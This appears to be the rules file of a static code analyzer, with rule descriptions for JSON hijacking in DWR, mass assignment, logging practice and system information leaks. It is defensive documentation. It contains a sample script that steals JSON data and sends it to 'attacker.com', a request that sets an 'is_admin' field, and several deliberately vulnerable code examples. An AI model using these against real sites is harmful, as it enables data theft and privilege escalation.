							  All released versions of DWR up to and including 1.1.4 are vulnerable to JavaScript hijacking [1]. Until now, the framework has not built any mechanisms for preventing the vulnerability. The good news is that DWR 2.0 is protected against JavaScript hijacking by a mechanism designed to prevent cross-site request forgery. The protection leverages the fact that malicious script cannot read secrets stored in cookies set by other domains, which allows the framework to use a value stored in a cookie as a secret shared between the client and server. DWR 2.0 automatically appends the session cookie to the request in the client and verifies on the server that each request contains the correct value.<br>An application or framework could be vulnerable to JavaScript hijacking if it:<br>      - Uses JavaScript as a data transfer format<br>      - Handles confidential data<br>Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a Web page, both the JavaScript and the Web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker.<br>JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a Web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional Web applications are not.<br>The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax . JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.<br><b>Example 1:</b> The following example begins by showing a legitimate JSON interaction between the client and server components of a Web application that is used to manage sales leads. It goes on to show how an attacker can mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.<br>The client requests data from a server and evaluates the result as JSON with the following code:<br><pre><br>var object;<br>var req = new XMLHttpRequest();<br>req.open("GET", "/object.json",true);<br>req.onreadystatechange = function () {<br>  if (req.readyState == 4) {<br>    var txt = req.responseText;<br>    object = eval("(" + txt + ")");<br>    req = null;<br>  }<br>};<br>req.send(null);<br></pre><br><br>When the code runs, it generates an HTTP request that looks like this:<br><pre><br>GET /object.json HTTP/1.1<br>...<br>Host: www.example.com<br>Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR<br></pre><br>(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)<br>The server responds with an array in JSON format:<br><pre><br>HTTP/1.1 200 OK<br>Cache-control: private<br>Content-Type: text/javascript; charset=utf-8<br>...<br>[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",<br>  "purchases":60000.00, "email":"brian@fortifysoftware.com" },<br> {"fname":"Katrina", "lname":"O'Neil", "phone":"6502135600",<br>  "purchases":120000.00, "email":"katrina@fortifysoftware.com" },<br> {"fname":"Jacob", "lname":"West", "phone":"6502135600",<br>  "purchases":45000.00, "email":"jacob@fortifysoftware.com" }]<br></pre><br>In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern Web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking.<br>If a victim can be tricked into visiting a Web page that contains the following malicious code, the victim's lead information will be sent to the attacker's Web site.<br><pre><br>&lt;script&gt;<br>// override the constructor used to create all objects so<br>// that whenever the "email" field is set, the method<br>// captureObject() will run. Since "email" is the final field,<br>// this will allow us to steal the whole object.<br>function Object() {<br> this.email setter = captureObject;<br>}<br><br>// Send the captured object back to the attacker's Web site<br>function captureObject(x) {<br>  var objString = "";<br>  for (fld in this) {<br>    objString += fld + ": " + this[fld] + ", ";<br>  }<br>  objString += "email: " + x;<br>  var req = new XMLHttpRequest();<br>  req.open("GET", "http://attacker.com?obj=" +<br>           escape(objString),true);<br>  req.send(null);<br>}<br>&lt;/script&gt;<br><br>&lt;!-- Use a script tag to bring in victim's data --&gt;<br>&lt;script src="http://www.example.com/object.json"&gt;&lt;/script&gt;<br></pre><br>The malicious code uses a script tag to include the JSON object in the current page. The Web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.<br>When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead.<br>Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both.<br>If the user is not logged into the vulnerable site, the attacker can compensate by asking the user to log in and then displaying the legitimate login page for the application. This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack.<br>More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] B. Chess, Y. O'Neil, and J. West <em>JavaScript Hijacking</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_mass_assignment_sensitive_field_exposure</key>
		<internalKey>Encapsulation/Mass Assignment/Sensitive Field Exposure
		</internalKey>
		<name>Mass Assignment: Sensitive Field Exposure</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A sensitive field is exposed to the model binder.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Modern frameworks allow developers to automatically bind HTTP request parameters from both request query and body into model objects for ease of development and increased productivity. If the binder is not correctly configured to control which HTTP request parameters are bound to which model attributes, an attacker may be able to abuse the model binding process and set any other attributes that should not be exposed to user control. This binding is possible even if the model attributes do not appear in the web forms or API contracts.<br><br><b>Example 1: </b> The following Spring controller method (<code>registerUser</code>) is accessed from a web form that asks a user to register an account by providing their first name, last name, and age:<br><br><pre><br>@RequestMapping(method = RequestMethod.POST)<br>public String registerUser(@ModelAttribute("user") User user, BindingResult result, SessionStatus status) {<br>  if (db.save(user).hasErrors()) {<br>    return "CustomerForm";<br>  } else {<br>    status.setComplete();<br>    return "CustomerSuccess";<br>  }<br>}<br></pre><br><br>If registration is successful, the user data will be persisted in the database. The <code>User</code> class is defined as:<br><br><pre><br>public class User {<br>  private String name;<br>  private String lastname;<br>  private int age;<br>  private Details details;<br><br>  // Public Getters and Setters<br>  ...<br>}<br></pre><br><br>And the <code>Details</code> class is defined as:<br><br><pre><br>public class Details {<br>  private boolean is_admin;<br>  private int id;<br>  private Date login_date;<br><br>  // Public Getters and Setters<br>  ...<br>}<br></pre><br><br>Given the above scenario, an attacker may be able to explore the application and discover that there is a <code>details</code> attribute in the <code>User</code> model. If this is the case, the attacker may then attempt to overwrite the current values assigned to their attributes.<br>If an attacker can find out these internal attributes, and the framework binder is not correctly configured in order to disallow binding of these attributes, then the attacker would be able to register an administrator account by sending the following request:<br><br><pre><br>name=John&amp;lastname=Smith&amp;age=22&amp;details.is_admin=true<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 915</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] OWASP <em>Mass assignment</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] Spring <em>Spring MVC Known Vulnerabilities and Issues</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_poor_logging_practice_logger_not_declared_static_final
		</key>
		<internalKey>Encapsulation/Poor Logging Practice/Logger Not Declared
			Static Final
		</internalKey>
		<name>Poor Logging Practice: Logger Not Declared Static Final</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Declare loggers to be static and final.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is good programming practice to share a single logger object between all of the instances of a particular class and to use the same logger for the duration of the program.<br><br><b>Example 1:</b> The following statement errantly declares a non-static logger.<br><br><pre><br>private final Logger logger =<br>            Logger.getLogger(MyClass.class);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_poor_logging_practice_multiple_loggers</key>
		<internalKey>Encapsulation/Poor Logging Practice/Multiple Loggers
		</internalKey>
		<name>Poor Logging Practice: Multiple Loggers</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Use logging levels rather than multiple loggers in a single class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Good logging practice dictates the use of a single logger for each class.<br><br><b>Example 1:</b> The following code errantly declares multiple loggers.<br><br><pre><br>public class MyClass {<br>  private final static Logger good =<br>            Logger.getLogger(MyClass.class);<br>  private final static Logger bad =<br>            Logger.getLogger(MyClass.class);<br>  private final static Logger ugly =<br>            Logger.getLogger(MyClass.class);<br>  ...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_poor_logging_practice_use_of_a_system_output_stream
		</key>
		<internalKey>Encapsulation/Poor Logging Practice/Use of a System
			Output Stream
		</internalKey>
		<name>Poor Logging Practice: Use of a System Output Stream</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using <code>System.out</code> or <code>System.err</code> rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <b>Example 1:</b> The first Java program that a developer learns to write often looks like this:<br><br><pre><br>public class MyClass<br>  public static void main(String[] args) {<br>    System.out.println("hello world");<br>  }<br>}<br></pre><br><br>While most programmers go on to learn many nuances and subtleties about Java, a surprising number hang on to this first lesson and never give up on writing messages to standard output using <code>System.out.println()</code>.<br><br>The problem is that writing directly to standard output or standard error is often used as an unstructured form of logging. Structured logging facilities provide features like logging levels, uniform formatting, a logger identifier, timestamps, and, perhaps most critically, the ability to direct the log messages to the right place. When the use of system output streams is jumbled together with the code that uses loggers properly, the result is often a well-kept log that is missing critical information.<br><br>Developers widely accept the need for structured logging, but many continue to use system output streams in their "pre-production" development. If the code you are reviewing is past the initial phases of development, use of <code>System.out</code> or <code>System.err</code> may indicate an oversight in the move to a structured logging system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_poor_style_non_final_public_static_field</key>
		<internalKey>Encapsulation/Poor Style/Non-final Public Static Field
		</internalKey>
		<name>Poor Style: Non-final Public Static Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Non-final public static fields can be changed by external classes.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Typically, you do not want to provide external classes direct access to your object's member fields since a public field can be changed by any external class. Good object oriented designed uses encapsulation to prevent implementation details, such as member fields, from being exposed to other classes. Further, if the system assumes that this field cannot be changed, then malicious code might be able to adversely change the behavior of the system.<br>'<br><b>Example 1:</b> In the following code, the field <code>ERROR_CODE</code> is declared as public and static, but not final:<br><br><pre><br>public class MyClass<br>{<br>public static int ERROR_CODE = 100;<br>//...<br>}</pre><br><br>In this case, malicious code might be able to change this error code and cause the program to behave in an unexpected manner.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 493</em> <br></p>
																									   <p>[2] Sun Microsystems, Inc. <em>Secure Coding Guidelines for the Java Programming Language, version 2.0</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak</key>
		<internalKey>Encapsulation/System Information Leak</internalKey>
		<name>System Information Leak</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An information leak occurs when system data or debugging information leaves the program through an output stream or logging function.<br><br><br><br><b>Example 1:</b> The following code prints an exception to the standard error stream:<br><br><pre><br>try {<br>    ...<br>} catch (Exception e) {<br>    e.printStackTrace();<br>}<br></pre><br><br>Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from &quot;Standard error&quot; or &quot;Standard output&quot; into a file or another program. Alternatively the system that the program runs on could have a remote logging mechanism such as a &quot;syslog&quot; server that will send the logs to a remote device. During development you will have no way of knowing where this information may end up being displayed.<br><br>In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.<br><br>Here is another scenario, specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication.<br><br><b>Example 2:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range.<br><pre><br>...<br>public static final String TAG = "NfcActivity";<br>private static final String DATA_SPLITTER = "__:DATA:__";<br>private static final String MIME_TYPE = "application/my.applications.mimetype";<br>...<br>public NdefMessage createNdefMessage(NfcEvent event) {<br>    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);<br>    String VERSION = tm.getDeviceSoftwareVersion();<br>    String text = TAG + DATA_SPLITTER + VERSION;<br>    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,<br>            MIME_TYPE.getBytes(), new byte[0], text.getBytes());<br>    NdefRecord[] records = { record };<br>    NdefMessage msg = new NdefMessage(records);<br>    return msg;<br>}<br>...<br></pre><br><br>NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper. In the example above, HP Fortify Static Code Analyzer reports a System Information Leak vulnerability on the return statement.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[13] Ernst Haselsteiner and Klemens Breitfuss <em>Security in Near Field Communication (NFC): Strengths and Weaknesses</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_apache_axis</key>
		<internalKey>Encapsulation/System Information Leak/Apache Axis
		</internalKey>
		<name>System Information Leak: Apache Axis</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An information leak occurs when system data or debugging information leaves the program through an output stream or logging function.<br><br><br><br>When set to <code>true</code>, <code>axis.enableListQuery</code> enables listing of the Web Service Deployment Descriptor (WSDD). This feature exposes the current system configuration which contains sensitive information like the adminservice password.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10]  <em>Axis Reference Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>
																									   <p>[20]  <em>Web Service Security</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_apache_axis_2</key>
		<internalKey>Encapsulation/System Information Leak/Apache Axis 2
		</internalKey>
		<name>System Information Leak: Apache Axis 2</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An information leak occurs when system data or debugging information leaves the program through an output stream or logging function.<br><br><br><br>This parameter tells Apache Axis 2 to send fault messages to clients. Fault messages contain stack traces and in some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[12]  <em>How to stop Axis2 sending stack traces in case of a fault?</em> WSO2<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_external</key>
		<internalKey>Encapsulation/System Information Leak/External
		</internalKey>
		<name>System Information Leak: External</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.  External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access.<br><br><br><br><b>Example 1:</b> The following code leaks Exception information in the HTTP response:<br><br><pre><br>protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {<br>    ...<br>    PrintWriter out = res.getWriter();<br>    try {<br>        ...<br>    } catch (Exception e) {<br>      out.println(e.getMessage());<br>    }<br>}<br></pre><br><br>This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.<br><br>In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device.<br><br><b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers.<br><pre><br>...<br>try {<br>  ...<br>} catch (Exception e) {<br>    String exception = Log.getStackTraceString(e);<br>    Intent i = new Intent();<br>    i.setAction("SEND_EXCEPTION");<br>    i.putExtra("exception", exception);<br>    view.getContext().sendBroadcast(i);<br>}<br>...<br></pre><br><br>Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication.<br><br><b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range.<br><pre><br>...<br>public static final String TAG = "NfcActivity";<br>private static final String DATA_SPLITTER = "__:DATA:__";<br>private static final String MIME_TYPE = "application/my.applications.mimetype";<br>...<br>TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);<br>String VERSION = tm.getDeviceSoftwareVersion();<br>...<br>NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this);<br>if (nfcAdapter == null)<br>  return;<br><br>String text = TAG + DATA_SPLITTER + VERSION;<br>NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,<br>            MIME_TYPE.getBytes(), new 